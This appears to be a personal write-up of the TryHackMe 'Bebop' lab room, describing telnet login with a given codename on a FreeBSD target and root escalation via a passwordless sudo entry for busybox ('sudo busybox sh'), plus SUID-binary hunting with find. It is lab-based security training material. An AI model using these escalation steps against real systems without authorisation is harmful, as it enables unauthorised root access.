TryHackMe writeup: Bebop

“tryhackme” (2020) published a room onto the TryHackMe platform that was inspired by a DEF CON presentation of a hacker discussing their experience hacking into their neighbour’s drone (DEFCONConference, 2015). This room features a FreeBSD system with an insecure — by design — telnet service and a simple, yet clever nonetheless, method of privilege escalation. In this article, I will discuss my experience in working out the solution to this room.

Procedure

Before I proceed to work out a solution to this room, I must first define the problem. In the case of this room, it is to work out the “user” flag and the “root” flag, with the former flag belonging to a normal system user and the latter belonging to a highly privileged user in the system.

This is a walkthrough room and one of the tasks (“tryhackme”, 2019, task 3) asks questions regarding the offensive security methods used to gain access to the system by unconventional means. The question battery can offer hints to the contender regarding what strategies to take when gaining access to the target system.

Recon

As usual with TryHackMe boot2root virtual machines, I clicked on the green-coloured button labeled “start machine” on the top-right corner of the first task. I gave the machine a few minutes to boot up and noticed that I have been assigned the codename pilot (“tryhackme”, 2019, task 1), which may show itself to be useful in gaining initial access to the system.

The system is most likely running FreeBSD (n.d.) and is running two services: an SSH service on port 22 and a telnet service on port 23. This room’s “quiz” confirms that target machine is running FreeBSD and that the vulnerable service to be exploited is telnet.

Initial access

I proceeded to telnet into port 23 of the target machine and was greeted with a login prompt:

┌──(dna@deniers)-[~/bebop]
└─$ telnet <target ip> 23
Trying <target ip>...
Connected to <target ip>.
Escape character is '^]'.
login:

I recalled from the first task that I was assigned the “codename” pilot, so I tried that in the login, and……….

FreeBSD 11.2-STABLE (GENERIC) #0 r345837: Thu Apr 4 02:07:22 UTC 2019

[pilot@freebsd ~]$

The initial access technique was rather simple. I can now begin to further probe the target system and solve the problem at hand.

Post exploitation

I can start with some rudimentary stuff. The first thing that I will do is attempt to get the user flag:

[pilot@freebsd ~]$ ls
user.txt
[pilot@freebsd ~]$ cat user.txt
[redacted]

Wonderful. I can now with the second task at hand: work out a solution to gain access to the infamous root account. The “quiz” task of this room asks the question: “what binary was used to escalate privillages [sic]?” I hypothesised that the a privilege escalation can be done through a binary with the SUID bit set. To do so, I ran the find command to get a list of binaries with the SUID bit set:

To work out which system utilities can be exploited to get root and how to go about exploiting them, I will compare the output from the above terminal to the GTFOBins (n.d.-a) reference. Unfortunately, from what I can tell, the only binary that seems remotely* exploitable in regards to getting into the root account is crontab (GTFOBins, n.d.-b), and it is not done through the SUID bit, but rather through the sudo utility.

*No pun intended 😋

Since I am not too familiar with FreeBSD (and privilege escalation in general), I decided to rely on the works of other hackers who completed this room. “MuirlandOracle” (2020) described the procedure that they implemented for privilege escalation:

“First, run sudo -l to work out what binaries can be ran as root. In this machine, the busybox (n.d.) utility can be ran as root. BusyBox is a utility that implements an amalgamation of different Unix-based utilities into a single executable. It can be exploited to run /bin/sh to get a root shell.” — Paraphrase of “MuirlandOracle” (2020).

I more or less did what MurilandOracle did. On the target system shell that I got, I executed the following commands:

[pilot@freebsd ~]$ sudo -l
User pilot may run the following commands on freebsd:
 (root) NOPASSWD: /usr/local/bin/busybox
[pilot@freebsd ~]$ sudo /usr/local/bin/busybox sh
# id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
# cat /root/root.txt
[redacted]

Allora.

Summary

This was rather short writeup for a room that was simple, yet cleverly made. The exploitation part was rather easy: telnet is by no means a secure system, and the more secure SSH service should be used in place of it.

Furthermore, there are not much difference between Linux and FreeBSD based systems.* The very same sudo -l technique that can be used to gain root access to a Linux system can also be used on FreeBSD systems (I just did not think to use sudo -l lol).

*For a funny story regarding the apparent differences between Linux and FreeBSD, see Attrition.org (1998).

Takeaways

  • The same techniques that can be used to root a Linux system are similar (and even identical in some cases) to the techniques used to root any other kind of Unix system.
  • sudo -l should be used as frequently as find / -perm -4000 when hunting for binaries to get root.
  • For the love of God, do not use telnet on a production system. It can only lead to trouble with hackers on steroids 😬
